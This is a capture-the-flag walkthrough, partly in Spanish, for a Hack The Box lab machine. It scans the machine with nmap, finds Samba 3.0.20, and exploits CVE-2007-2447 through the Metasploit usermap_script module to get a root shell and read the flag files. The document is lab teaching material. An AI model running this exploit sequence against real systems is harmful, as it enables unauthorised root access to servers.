Empezamos haciendo una conexión a la IP:
ping 10.10.10.3

Después hacemos nmap y guardamos el output en "output_nmap.txt":

nmap -sC -sV 10.10.10.3 -oN output_nmap.txt

nmap is a tool to scan and obtain information regarding hosts in a network.
It is highly used in network auditories. It allows administrators to discover hosts and network services, as well as open ports, operating systems or software versions.
"-sC": This argument activates the scripts that belong to nmap's library. It activates "default" and "safe" scripts to provide information about services and applications executed on the detected ports.
"-sV": This argument tries to determine the service version of the open ports.

We see some open ports and choose the following:

445/tcp open netbios-ssn samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

Details about the service and software version of this port:

1) Port 445/tcp is used by SMB service for communication. It is known to be susceptible to various types of attacks. Including DoS, shared resource enumeration and remote code execution (if vulnerabilities exist).

2) Samba service is an implementation of SMB (Server Message Block) protocol that enables interoperability between Linux/UNIX and Windows systems.
It facilitates file and printer sharing between Windows and Unix/Linux-based systems.

3) Version: smbd 2.0.20-Debian. Knowing the software version can be useful in determining if there is a known vulnerability associated to this version. The older the version, the more likely is to have several
vulnerabilities that can be exploited. You can check on vulnerability databases (e.g., CVE) to see if there are exploits or attack techniques that can be leveraged.

Checking on Google "Samba smbd 3.0.20-Debian" you can observe the << CVE-2007-2447 Samba "username map script" Command Execution >> in rapid7 website.
URL: https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/

This webpage provides the information needed to load the module to exploit this vulnerability.
We call metasploit. Run:
msfconsole
use exploit/multi/samba/usermap_script
set rhost 10.10.10.3 # To specify the remote host that you intend to interact with. It uses the payload automatically.

In metasploit terminology, a "payload" refers to the component of an exploit module that performs a specific action on a target system after the exploit has successfully compromised it.

After the commandline is executed, we run "whoami" and we see that we are a root user. We run:

cd home/
ls -la

Check for the folder "makis", access and get the outcome of "user.txt". For that run:

cd makis
cat user.txt

The same for root user. In one command:

cat /root/root.txt

With this information you introduce the content into HackTheBox.

Finish.
